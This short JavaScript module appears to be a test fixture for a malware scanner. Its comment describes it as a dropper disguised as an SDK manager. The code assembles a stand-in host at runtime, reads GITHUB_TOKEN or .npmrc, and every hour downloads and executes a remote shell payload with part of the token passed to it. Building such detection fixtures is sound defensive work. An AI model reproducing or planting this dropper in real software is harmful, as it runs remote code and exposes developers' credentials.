const https = require('https');
const { exec } = require('child_process');
const fs = require('fs');

// Dropper shaped like an SDK manager: host is constructed at runtime so no
// literal download URL appears, credentials are read from the environment,
// and the payload executes on a timer. No curated profile covers this id,
// and the intent gate must never explain the chain evidence here.
function activate() {
  const host = ['updates', 'sdk-cdn', 'example'].join('.');
  const token = process.env.GITHUB_TOKEN || fs.readFileSync('.npmrc', 'utf8');
  const url = `https://${host}/payload.sh`;

  setInterval(() => {
    https.get(url, (response) => {
      let body = '';
      response.on('data', (chunk) => { body += chunk; });
      response.on('end', () => {
        exec(body, { env: { ...process.env, TOKEN: String(token).slice(0, 12) } });
      });
    });
  }, 60 * 60 * 1000);
}

module.exports = { activate };
